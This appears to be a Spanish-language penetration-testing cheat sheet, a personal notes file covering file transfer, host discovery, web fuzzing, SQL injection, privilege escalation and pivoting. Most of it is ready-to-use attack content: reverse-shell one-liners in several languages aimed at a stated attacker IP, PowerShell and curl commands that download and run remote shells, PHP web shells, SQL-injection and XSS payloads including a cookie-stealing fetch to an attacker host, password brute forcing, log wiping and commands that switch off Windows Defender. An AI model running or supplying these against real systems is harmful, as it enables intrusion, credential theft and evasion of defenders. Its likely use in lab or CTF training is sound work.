H A C K I N G   H Y P E:
██ 20% ... 
███ 40% .... 
████ 60% ..... 
█████ 80% ......
██████ 100% ....... COMPLETED

⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀W E L C O M E⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀  H A C K E R⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



TRANSFERENCIA DE ARCHIVOS  
..........................

sudo python -m http.server 80
sudo python -m SimpleHTTPServer 80
sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/kali/Downloads

     Target Linux: 
         wget http://[IP]/recurso
         
     Target Windows:
         certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
         powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
         Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
         powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
         powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
         copy \\IP\recurso


TRATAMIENTO TTY
...............

LINUX

   ------ option 1 -------
   script /dev/null -c bash
   ctrl+z
   stty raw-echo
   fg
   reset
   xterm
   export TERM=xterm
   export SHELL=bash
   stty rows 52 columns 180

   ------ option 2 -------
   script /dev/null -c bash
   ctrl+z
   stty raw-echo
   fg
   reset
   xterm
   export TERM=xterm
   export SHELL=bash
   stty rows 52 columns 180

   ------ option 3 -------
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=screen-256color
   [Ctrl + z]
   echo $TERM
   stty raw -echo
   fg
   [INTRO]

oneliner: stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

other....
   script -q /dev/null -c bash
   /usr/bin/script -qc /bin/bash /dev/null
   
WINDOWS
   https://github.com/antonioCoco/ConPtyShell


DESCUBRIMIENTO DE HOSTS
........................

arp-scan -I [interfaz] [rango IP] -g --> más recomendado!
netdiscover -r [rango IP]
hostdiscover.sh
masscan --> https://www.kali.org/tools/masscan/


FUZZING WEB
...........

wfuzz -c -t 400 --hc=404 -w [wordlist] [url]/FUZZ
wfuzz -c -t 400 --hc=404 -w [wordlist] -w [archivo_extensiones] [url]/FUZZ.FUZ2Z
wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar numeros del 0 al 100

nmap -p [PUERTO] --script http-enum [IP]

gobuster dir --url http://IP --wordlist /usr/share/wordlists/dirb/big.txt
gbuster vhost -u http://IP/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20 --> escaneo de subdominios

ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> Searching for LFI
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" --> Username enumeration with ffuf
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058 --> escaneo de subdominios

dirb http://IP /path/to/wordlist

dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f

Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:
    dirb http://[IP]/ -u user:password


REVERSE SHELL
.............

https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
https://deephacking.tech/reverse-shells-en-windows/
https://www.revshells.com/

si no funciona....
    1.creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
    2.compartimos ese archivo mediante python -m....
    3.lo ejecutamos /usr/bin/curl IP/ARCHIVO|bash


Los siguientes ejemplos suponen que la IP del atacante es 8.8.8.8 y utiliza el puerto 8080 para la conexión.
Por lo tanto, en todos estos casos, debe escuchar el puerto 8080 con el siguiente comando:
nc -vv -l -p 8080

// Bash
bash -i >& /dev/tcp/8.8.8.8/8080 0>&1
/bin/bash -c "bash -i >& /dev/tcp/10.8.7.38/443 0>&1"

// Perl
perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

// Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// PHP
php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

     pdf php inclusion:
          %PDF-1.4
          <?php
              system($_GET["cmd"]);
          ?>

// Ruby
ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

// Netcat
nc -e /bin/bash 8.8.8.8 8080

// PowerShell
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/


BASE64
........
https://www.base64decode.org/

Encode --> echo -n "text" | base64
Decode --> echo aG9sYXNveXBlcGU= | base64 -d; echo


NMAP
....

sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u --> mostrar todas las categorias de scripts nse que tiene nmap
          ej: nmap -p[PUERTO] [IP] --script="categoria"

     https://nmap.org/man/es/index.html


WEB SHELL
..........

Ejecucion de comando por navegador atacante:

     archivo .php en victima:
          <?php
               echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
          ?>

     en navegador atacante:
          http://IP/archivo.php?cmd=whoami

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
https://book.hacktricks.xyz/shells/shells/msfvenom
https://github.com/frizb/MSF-Venom-Cheatsheet
    

COMMON PORTS
............

25 - SMTP
22 - SSH
110 - POP3
143 - IMAP
80 - HTTP
443 - HTTPS
8080, 8081 - HTTP Proxy
137, 138, 139 - NETBIOS
135 - RPC
115 - SFTP
23 - Telnet
21 - FTP
3389 - RDP
3306 - MySQL
1433 - MS SQL Server
445 - SMB
123 - NTP
179 - BGP
69 - TFTP
88 - Kerberos
102 - MS Exchange
53 - DNS
5985 - winRM HTTP
5986 - winRM HTTPS


BANNER GRABING
...............

nc -nv  <IP> <port>


SSRF
.....

https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=


SQLMAP
.......

sqlmap -u http://[IP] -p parameter

sqlmap -u http://[IP] –os-shell

sqlmap -u http://[IP] –dump

sqlmap -u http://[IP]/?id=1 --dbs

sqlmap -u http://[IP]/?id=1 -D database_name --tables

sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns

sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all

sqlmap -r request.req -p <parametro inyectable> --batch --dbs --> mediante archivo de petición guardado de Burp

More....https://hackersonlineclub.com/sql-injection-cheatsheet/


MANUAL SQLi
............

admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-

     authentication bypass

          '-'
          ' '
          '&'
          '^'
          '*'
          ' or 1=1 limit 1 -- -+
          '="or'
          ' or ''-'
          ' or '' '
          ' or ''&'
          ' or ''^'
          ' or ''*'
          or true--
          " or true--
          ' or true--
          ") or true--
          ') or true--
          ' or 'x'='x
          ') or ('x')=('x
          ')) or (('x'))=(('x
          or 2 like 2
          or 1=1/*
          admin' --
          admin' -- -
          admin' #
          admin'/*
          admin') or ('2' LIKE '2
          admin') or ('2' LIKE '2'#
          admin') or ('2' LIKE '2'/*
          admin' or '1'='1
          admin' or '1'='1'--
          admin' or '1'='1'#
          admin' or '1'='1'/*
          admin'or 1=1 or ''='
          admin' or 1=1
          1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
          1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055


CRACKING PASSWORDS/LOGIN WEB
.............................

https://hashes.com/en/decrypt/hash
https://hashcat.net/wiki/doku.php?id=example_hashes

sudo john --format=[format] --wordlist=[path to wordlist] [path to file]

john --list=formats ver cifrados que admite john

Si queremos juntar /etc/passwd y /etc/shadow para luego crackear...
     unshadow passwd.txt shadow.txt > unshadow.txt
     john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

Replace "ssh" with any service name

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
     Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 
     Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"

SMB
....

enum4linux -a <IP address>
smbclient -L IP -N

    Para conectarse:
        smbclient //IP/RECURSO -n
    Una vez dentro para descargar archivos:
        prompt off
        mget *
        smbget -R smb://IP/recurso

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
smbmap -H [IP]
smbmap -H [IP] -u [user] -p [password] -- probar usuario y una única contraseña para ver recursos compartidos
crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios 
crackmapexec smb [IP] -u [user] -p [passwords] -- probar usarios y contraseñas
smbmap 


RPC, NetBios
.............

rpcinfo -p $TARGET
nbtscan $TARGET
rpcclient -U "" $TARGET


SMTP
.....

smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150


NFS
....

*Listar recursos nfs en una maquina:
    showmount -e [IP]

*Para conectarse al recurso:
    sudo mount -t nfs IP:/recurso unacarpetanuestra


LINUX TRICKS
.............

lsof -i:80 --> ver que servicio/proceso está ocupando el puerto 80
pwdx [pid] --> ver en que ruta tiene origen ese proceso/servicio

shred -zun 5 -v --> borrar rastro, logs....
     https://hackingpassion.com/clear-your-tracks-on-linux/
     https://null-byte.wonderhowto.com/how-to/clear-logs-bash-history-hacked-linux-systems-cover-your-tracks-remain-undetected-0244768/


COMPILAR PROGRAMAS C
.....................

Windows
     i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

Linux
     gcc program.c –o executable.exe


FIND WINDOWS UNQUOTED SERVICE PATHS
....................................

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """


ESCAPAR COMANDOS
.................

Simplemente hay que poner ciertos carácteres aleatorios ocupando el espacio que habria al poner el comando normal con su ruta completa, por ejemplo:

cat
    normal= cat /etc/passwd 
    extendido= /bin/cat /etc/passwd
    extendido escapado= /???/??t /etc/passwd
    extendido normal=c${HOA}at /etc/passwd


METASPLOIT INIT
................

sudo msfdb init
sudo service postgresql start
sudo msfconsole


FIND FLAGS 
...........

Linux 
     find / -type f -name "*.txt"
     find / -type f -name "user.txt"
     find / -type f -name "root.txt"

Windows --> 
     

DOCKER
.......

docker ps -a --> listar todos los contenedores que están en ejecución en el sistema
docker exec -it 123456789 bash --> ejecutar el comando “bash” en el contenedor con el identificador “123456789“ se abrirá una shell


TRATAMIENTO DE IMAGENES
........................

exiftool imagen.png --> Sacar datos exif de una imagen
strings imagen.png --> Sacar los strings, texto, datos ocultos de una imagen


OTROS RECURSOS
...............

Extension firefox Hack-Tools
Hacking_Help_Sheet_Resume1.png
Hacking_Help_Sheet_Resume2.png


WORDPRESS
..........

wpscan --url [URL] -e u
wpscan --url [URL]
wpscan --url [URL] --usernames admin --passwords rockyou.txt --max-threads 5 --> Fuerza bruta panel login wordpress
     Otra forma... https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
wpscan --url [URL] -e vp --> Enumerar plugins vulnerables en el sitio web


JOOMLA
.......

joomscan -u [URL]
https://github.com/OWASP/joomscan


DRUPAL
.......

droopescan scan drupal -u [URL]
https://github.com/SamJoan/droopescan


MAGENTO
........

magescan.phar scan:all [URL]
https://github.com/steverobbins/magescan


NIKTO
.....

nikto -h scanme.nmap.org
nikto -h https://nmap.org -ssl --> Si la web va por HTTPS
nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli --> Escanea en busca de vulnerabilidades SQLi


RDP
....

xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard

rdesktop <RHOST>

ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login

crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking 


VULNERABILIDAD LOG4J
....................

https://guglia001.github.io/cve/poc/articulo/log4j-CVE-POC/
https://jmlgomez73.github.io/log4shell/
https://github.com/fullhunt/log4j-scan


ACTIVE DIRECTORY
................

https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html


XSS
....
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>

<script>alert('Found')</script>
"><script>alert(Found)</script>">
<script>alert(String.fromCharCode(88,83,83))</script>
"  onload="alert(String.fromCharCode(88,83,83))
" onload="alert('XSS')
<img src='bla' onerror=alert("XSS")>

      Mario Bros XSS
         <iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
         <input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>
         
  
WORDLISTS
..........

PacketStorm
SecList
cotse
DefaultPassword
RouterPassword
Pastebin
RainbowCrack


ENUM PRIVESC
.............

     Linux
          sudo -l
          whoami
          uname -a
          ls -la
          ss -tulwn
          cat /etc/crontab
          cat /etc/passwd
          find / -perm -u=s -type f 2>/dev/null
          find / -perm -4000 2>/dev/null
          hostname
          cat /proc/version
          history
          ifconfig
          netstat
          pwd
          env
          getcap -r / 2>/dev/null
          systemctl list-timers
          pspy
          *Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios: find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;

     Windows
          hostname
          whoami
          whoami /priv
          syteminfo
          ipconfig
          cmdkey /list
          icacls
          schtasks /query
          dir
          sc
          set
          netstat
          reg /query
          sc query windefend
          sc queryex type=service
          WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
          netsh advfirewall firewall dump
          Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
          *Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
          

ENUMERACION WEB
................
DNS
   dig axfr [dominio]
   nslookup
whatweb [URL]
curl --> https://www.keycdn.com/support/popular-curl-examples
sslscan [dominio]


AUTORECON TOOL
...............
sudo apt update
sudo apt install python3
sudo apt install python3-pip
sudo apt install seclists
sudo apt install curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
sudo apt install python3-venv
python3 -m pip install --user pipx
python3 -m pipx ensurepath
[close terminal]
[open terminal]
pipx install git+https://github.com/Tib3rius/AutoRecon.git
sudo env "PATH=$PATH" autorecon [IP]


PIVOTING
.........

How to set route
     ip route add <Network To Which We Need Access> via <GATEWAY>
         ejemplo:
             ip route add 192.168.1.0/24 via 10.10.15.1

SSH Local Port Forwarding:
     ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
     ssh -L source_port:forward_to_host:destination_port via_host

SSH Remote Port Forwarding:
     ssh -R sourcePort:HostToForwardTrafficTo:onPort connectToHost
     ssh -R PORT:IP:port root@ip

Windows Netsh:
     netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

Metasploit
     portfwd add –l 3389 –p 3389 –r target-host

Socat
     https://github.com/3ndG4me/socat
     socat TCP4-LISTEN:81 TCP4:IP:PORT
     socat TCP4-LISTEN:81,fork,reuseaddr TCP4:TCP4:IP

Proxychains (Configurar primero Proxychains socks4 o socks5)
     /etc/proxychains.conf
     [ProxyList]
     socks4 localhost 8080
     socks5 localhost 1080

Chisel
     https://github.com/jpillora/chisel
     Server: chisel server -p 443 -reverse -v --socks5
     Client: chisel client <server_ip>:443 R:socks

Sshuttle:
     https://github.com/sshuttle/sshuttle
     sshuttle -r username@sshserver IP -vv
     DNS: sshuttle --dns -vvr username@sshserver 0/0

SharpSocks:
     https://github.com/nettitude/SharpSocks

Pivotnacci:
     https://github.com/blackarrowsec/pivotnacci
     pivotnacci https[:]//domain[.]com/agent  --password "s3cr3t"
     pivotnacci https[:]//domain[.]com/agent  --polling-interval 2000

Metasploit
     run autoroute -s subnet /24
     route add subnet subnet_mask session_id 
     use auxiliary/server/socks_proxy

Para utilizar los túneles y pasar a traves de internet, podemos usar VPS o herramientas como Ngrok.
https://lnkd.in/dBqFskwM
./ngrok http 4433
./ngrok tcp 4433

